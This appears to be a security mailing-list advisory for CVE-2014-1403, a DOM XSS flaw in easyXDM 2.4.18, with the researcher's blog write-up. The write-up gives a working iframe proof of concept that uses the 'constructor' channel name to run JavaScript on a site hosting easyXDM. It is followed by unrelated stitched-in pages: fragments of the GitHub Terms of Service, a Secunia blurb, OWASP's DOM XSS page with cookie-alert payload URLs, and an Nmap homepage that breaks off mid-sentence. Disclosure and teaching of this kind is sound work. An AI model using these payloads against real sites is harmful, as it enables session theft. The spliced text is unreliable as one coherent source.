# [CVE-2014-1403] DOM XSS in EasyXDM 2.4.18

---

*From*: Krzysztof Kotowicz <kkotowicz+fd () gmail com>

*Date*: Fri, 31 Jan 2014 22:24:10 +0100

---

```
Affected products
=================
easyXDM library < 2.4.19 - <http://easyxdm.net/wp/>

easyXDM is a Javascript library that enables you as a developer to easily
work around the limitation set in place by the Same Origin Policy, in turn
making it easy to communicate and expose javascript API's across domain
boundaries.

Vulnerabilities are fixed in version 2.4.19. All users are advised to
upgrade.

CVE
===
CVE-2014-1403

DOM XSS in name.html location.hash value
========================================

Description
-----------
EasyXDM uses name.html file to bootstrap cross origin communication
between documents. It accepts various parameters in location.hash value,
one of which is the URL of the document to load. Value of this parameter
is not filtered, allowing to pass javascript: URL that may execute
arbitrary Javascript code in context of the domain hosting EasyXDM
installation.

This vulnerability is described in greater details in [1]

Analysis
--------
The root cause of the vulnerability is the following code in name.html
file:

    if (location.hash) { // DOM XSS source
      if (location.hash.substring(1, 2) === "_") {
        var channel, url,
          hash = location.href.substring(location.href.indexOf("#") + 3),
        indexOf = hash.indexOf(",");
        if (indexOf == -1) {
          channel = hash;
        }
        else {
          channel = hash.substring(0, indexOf);
          url = decodeURIComponent(hash.substring(indexOf + 1));
        }
        switch (location.hash.substring(2, 3)) {
          /...
          case "3":
            // NameTransport remote
            var guest = window.parent.frames[
              "easyXDM_" + channel + "_provider"
              ];
            if (!guest) {
              throw new Error("unable to reference window");
            }
            guest.easyXDM.Fn.get(channel)(window.name);
            location.href = url + "#_4" + channel + ","; // DOM XSS sink
            break;

Part of location hash, under certain conditions, ends up in location.href
assignment, triggering JS execution.

### [XSSing with Shakespeare: Name-calling easyXDM](http://blog.kotowicz.net/2014/01/xssing-with-shakespeare-name-calling.html)

**tl;dr**: window.name, DOM XSS & abusing Objects used as containers
## What's in a name?

"What's in a name? That which we call a rose
By any other name would smell as sweet"

*(Romeo & Juliet, Act II, Scene 2)*

While Juliet probably was a pretty smart girl, this time she got it wrong. There **is** something special in a name. At least in window.name. For example, it can ignore Same Origin Policy restrictions. Documents from https://example.com and https://foo.bar are isolated from each other, but they can "speak" through window.name.

Since name is special for Same Origin Policy, it must have some evil usage, right? Right - the cutest one is that eval(name)is the shortest XSS payload loader so far:

* create a window/frame
* put the payload in it's name
* just load http://vuln/?xss="><script>eval(name)</script>.

But that's [old news](http://sla.ckers.org/forum/read.php?2,32990) (I think it was [Gareth](http://www.businessinfo.co.uk/)'s trick, correct me if I'm wrong). This time I'll focus on exploiting software that uses window.name for legitimate purposes. A fun practical challenge (found by accident, srsly)!

## Best men are moulded out of faults

"They say, best men are moulded out of faults;

And, for the most, become much more the better

For being a little bad;"

*(Measure for Measure, Act V, Scene 1)*

I have looked at [EasyXDM](http://easyxdm.net/wp/) in the past ([part 1](http://blog.kotowicz.net/2013/09/exploiting-easyxdm-part-1-not-usual.html), [part 2](http://blog.kotowicz.net/2013/10/exploiting-easyxdm-part-2-considered.html)), so I won't bore your with introducing the project. This time I've found a [DOM XSS](https://www.owasp.org/index.php/DOM_Based_XSS) vulnerability that allows the attacker to execute arbitrary code in context of any website using EasyXDM <= 2.4.18. It's fixed in **2.4.19** and has a **CVE-2014-1403** identifier. Unlike many other DOM XSSes (with oh-so-challenging location.href=location.hash.slice(1) ), exploiting this was both fun & tricky, hence this blog post.

Every EasyXDM installation has a name.html document which assists in setting up the cross-document channels. This is the main part of the code that executes when you load the document:

```
if (location.hash) { // DOM XSS source
  if (location.hash.substring(1, 2) === "_") {
    var channel, url, hash = location.href.substring(location.href.indexOf("#") + 3), indexOf = hash.indexOf(",");
    if (indexOf == -1) {
      channel = hash;
    }
    else {
      channel = hash.substring(0, indexOf);
      url = decodeURIComponent(hash.substring(indexOf + 1));
    }
    switch (location.hash.substring(2, 3)) {
      case "2":
        // NameTransport local
        window.parent.parent.easyXDM.Fn.get(channel)(window.name);
        location.href = url + "#_4" + channel + ",";
        break;
      case "3":
        // NameTransport remote
        var guest = window.parent.frames["easyXDM_" + channel + "_provider"];
        if (!guest) {
          throw new Error("unable to reference window");
        }
        guest.easyXDM.Fn.get(channel)(window.name); // execute function, ignore results
        location.href = url + "#_4" + channel + ","; // DOM XSS sink
        break;
      case "4":
        // NameTransport idle
        var fn = window.parent.easyXDM.Fn.get(channel + "_load");
        if (fn) {
          fn();
        }
        break;
    }
  }
}

```

So we have a DOM XSS flaw - content in location hash can reach location.href assignment. After quick debugging (exercise left to the reader) we can see that the payload would look somewhat like this:

name.html#\_3channel,javascript:alert(document.domain)//
## Sea of troubles

"To be, or not to be, that is the question—

Whether 'tis Nobler in the mind to suffer

The Slings and Arrows of outrageous Fortune,

Or to take Arms against a Sea of troubles,

And by opposing end them"

*(The Tragedy of Hamlet, Prince of Denmark, Act III, Scene 1)*

It's not the end though. We still have some problems to overcome. Before location.href gets assigned two statements must execute without throwing errors:
```
var guest = window.parent.frames["easyXDM_" + channel + "_provider"];
guest.easyXDM.Fn.get(channel)(window.name);

```
**First statement:** So we need to frame name.html. No problem, it's supposed to be framed anyway (it's not a bug, it's a feature!). Then we need a separate *provider* frame, and this frame needs to be in-domain with name.html and have an easyXDM.Fn object available. Luckily, easyXDM project has a lot of .html documents with easyXDM libraries initialized. Quickly looking at examples/ subdirectory we can pick e.g. example/bridge.html. So, we need something like this:
```
<iframe src=http://domain/name.html#payload ></iframe>
  <iframe name="easyXDM_channel_provider" src="http://domain/example/bridge.html"> </iframe>

```
**Second statement:**guest.easyXDM.Fn.get(channel)(window.name). So, get() (loaded from bridge.html document) **must return a function accepting a string**. Let's look at what get() does:
```
var _map = {};

/**
 * @class easyXDM.Fn
 * This contains methods related to function handling, such as storing callbacks.
 * @singleton
 * @namespace easyXDM
 */
easyXDM.Fn = {

    /**
     * Retrieves the function referred to by the given name
     * @param {String} name The name of the function to retrieve
     * @param {Boolean} del If the function should be deleted after retrieval
     * @return {Function} The stored function
     * @namespace easyXDM.fn
     */
    get: function(name, del){
        var fn = _map[name];

        if (del) {
            delete _map[name];
        }
        return fn;
    }
};

```
Crap! It will return a function from some \_map container, but that container is initially empty! So we're basically doing: {}[channel](window.name) - this will obviously fail quickly as {}[anything] returns undefined. And undefined is definitely not a Function. We can either try to find some other document or use more easyXDM magic that will fill the container before accessing it. Too much work. Let's use Javascript instead!
## "I know a trick worth two of that"

*(King Henry IV, Act II, Scene 1)*

You see, empty object ({}) is not that empty. It inherits from it's prototype - Object.prototype:

|  |
| --- |
| JS prototypical inheritance rulez! |

So, naming our channel 'constructor' will cause two above JS statements to correctly execute, followed by location.hash assignment - and that completes the exploit.
```
<iframe id=f></iframe>
  <iframe name="easyXDM_constructor_provider"
src="http://easyxdm.net/current/example/bridge.html"
onload="document.getElementById('f').src='http://easyxdm.net/current/name.html#_3constructor,javascript:alert(document.domain)//';">
</iframe>

```

## All's well that ends well

"Of that and all the progress, more or less,

Resolvedly more leisure shall express:

All yet seems well; and if it end so meet,

The bitter past, more welcome is the sweet."

*(All's well that ends well, Act V, Scene 3)*

The vulnerability was quickly reported and fixed in version **2.4.19**. Do upgrade! Programmers, remember - don't use {} as data constructor without proper key validation (see Object.hasOwnProperty()). And in your documents don't connect sources with sinks!

Great writeup. I often see cb[cb\_name](anydata) e.g. in facebook debug.js but it's not really exploitable, as your bug is 60 percent in location.hash assignment, which we don't get usually. Sometimes I see any\_object.any\_method(not\_controlled) which is also interesting case

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# DOM Based XSS

Thank you for visiting OWASP.org. We have migrated our community to a new web platform and regretably the content for this page needed to be programmatically ported from its previous wiki page. There’s still some work to be done.

This is an example of a Project or Chapter Page.

## DOM Based XSS

### Definition

DOM Based [XSS](XSS "wikilink") (or as it is called in some texts,
“type-0 XSS”) is an XSS attack wherein the attack payload is executed
as a result of modifying the DOM “environment” in the victim’s browser
used by the original client side script, so that the client side code
runs in an “unexpected” manner. That is, the page itself (the HTTP
response that is) does not change, but the client side code contained in
the page executes differently due to the malicious modifications that
have occurred in the DOM environment.

This is in contrast to other XSS attacks ([stored or
reflected](XSS#Stored_and_Reflected_XSS_Attacks "wikilink")), wherein
the attack payload is placed in the response page (due to a server side
flaw).

Please note research from David Wichers seeking to reclassify DOM XSS
more strictly as CLIENT SIDE XSS.
<https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29>

### Example

Suppose the following code is used to create a form to let the user
choose their preferred language. A default language is also provided
in the query string, as the parameter “default”.

```
…

Select your language:

<select><script>

document.write("<OPTION value=1>"+decodeURIComponent(document.location.href.substring(document.location.href.indexOf("default=")+8))+"</OPTION>");

document.write("<OPTION value=2>English</OPTION>");

</script></select>
…

```

The page is invoked with a URL such as:

```
http://www.some.site/page.html?default=French

```

A DOM Based XSS attack against this page can be accomplished by sending
the following URL to a victim:

```
http://www.some.site/page.html?default=<script>alert(document.cookie)</script>

```

When the victim clicks on this link, the browser sends a request for:

```
/page.html?default=<script>alert(document.cookie)</script>

```

to www.some.site. The server responds with the page containing the above
Javascript code. The browser creates a DOM object for the page, in which
the document.location object contains the string:

```
http://www.some.site/page.html?default=<script>alert(document.cookie)</script>

```

The original Javascript code in the page does not expect the default
parameter to contain HTML markup, and as such it simply decodes and echoes
it into the page (DOM) at runtime. The browser then renders the resulting
page and executes the attacker’s script:

```
alert(document.cookie)

```

Note that the HTTP response sent from the server does not contain the
attacker’s payload. This payload manifests itself at the client-side
script at runtime, when a flawed script accesses the DOM variable
document.location and assumes it is not malicious. In addition, most
browsers URL encode document.location by default which reduces the
impact or possibility of many DOM XSS attacks.

### Advanced Techniques and Derivatives

In the example above, while the payload was not embedded by the server
in the HTTP response, it still arrived at the server as part of an HTTP
request, and thus the attack could be detected at the server side. The
[“DOM Based XSS”
paper](http://www.webappsec.org/projects/articles/071105.shtml) ([1])
details a technique to avoid server side detection. It also describes
several other possible locations for the payload, besides
document.location.

The technique to avoid sending the payload to the server hinges on the
fact that URI fragments (the part in the URI after the “#”) is not sent
to the server by the browser. Thus, any client side code that
references, say, document.location, may be vulnerable to an attack which
uses fragments, and in such case the payload is never sent to the
server. For example, the above DOM based XSS can be modified into:

```
http://www.some.site/page.html#default=<script>alert(document.cookie)</script>

```

which mounts the same attack without it being seen by the server (which
will simply see a request for page.html without any URL parameters).

In December 2006, Stefano Di Paola and Giorgio Fedon described a
[universal XSS attack against the Acrobat PDF
plugin](http://events.ccc.de/congress/2006/Fahrplan/attachments/1158-Subverting_Ajax.pdf)
([4]). This attack applied the fragment variant of DOM based XSS to
PDF documents. The researchers discovered that a PDF document served to
the browser, when rendered by the Acrobat plugin, may end up executing
part of the fragment as Javascript. Since the Javascript is executed in
the context (DOM) of the current site, all an attacker needed to exploit
this flaw was to simply find a PDF link somewhere on the site for the
XSS condition to be met. If the attacker then tricked a user into
clicking on (or submitting) a link like:

```
http://www.some.site/somefile.pdf#somename=javascript:attackers_script_here

```

then a victim using an un-patched Acrobat reader would succumb to the
attack. Adobe patched their reader after they were made aware of this
flaw, but if not all users have downloaded the patch then those users
are still vulnerable to this type of attack.

Ivan Ristic did some research and proposed some server side defenses
against this type of attack in the presentation “Protecting Web
Applications from Universal PDF XSS: A discussion of how weird the web
application security world has become” at the [2007 OWASP Europe AppSec
Conference](OWASP_AppSec_Europe_2007_-_Italy "wikilink") in Milan. The
presentation ([5]) can be downloaded
[here](https://wiki.owasp.org/images/c/c2/OWASPAppSec2007Milan_ProtectingWebAppsfromUniversalPDFXSS.ppt).

### Extensions

Ory Segal gave an example (section “Javascript flow manipulation” in
[2]) of how a target page can be framed and the frame’s parent (in the
attacker’s control) can be devised in such manner that it affects the
execution of the target page in a way desired by the attacker. The
technique shows how DOM manipulation can be useful to modify the
execution flow of scripts in the target page.

Kuza55 and Stefano Di Paola discussed more ways in which the concept of
DOM manipulation and DOM based XSS can be extended in [3].

### Testing Tools and Techniques

1. The DOM XSS Wiki - The start of a Knowledgebase for defining sources
of attacker controlled inputs and sinks which could potentially
introduce DOM Based XSS issues. Its very immature as of 11/17/2011.
Please contribute to this wiki if you know of more dangerous sinks
and/or safe alternatives!!

See: [http://code.google.com/p/domxsswiki/](https://code.google.com/p/domxsswiki/)

2. DOM Snitch - An experimental Chrome extension that enables
developers and testers to identify insecure practices commonly found in
client-side code. From Google.

See: [http://code.google.com/p/domsnitch/](https://code.google.com/p/domsnitch/)

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
